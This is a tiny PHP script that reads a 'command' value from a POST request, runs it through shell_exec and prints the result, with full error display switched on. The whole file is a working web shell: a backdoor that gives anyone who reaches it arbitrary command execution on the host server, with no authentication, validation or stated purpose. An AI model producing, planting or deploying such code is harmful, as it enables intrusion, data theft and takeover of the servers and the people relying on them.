<?php
    ini_set('display_errors', '1');
    ini_set('error_reporting', E_ALL);

$command = $_POST['command'];

echo shell_exec($command);

?>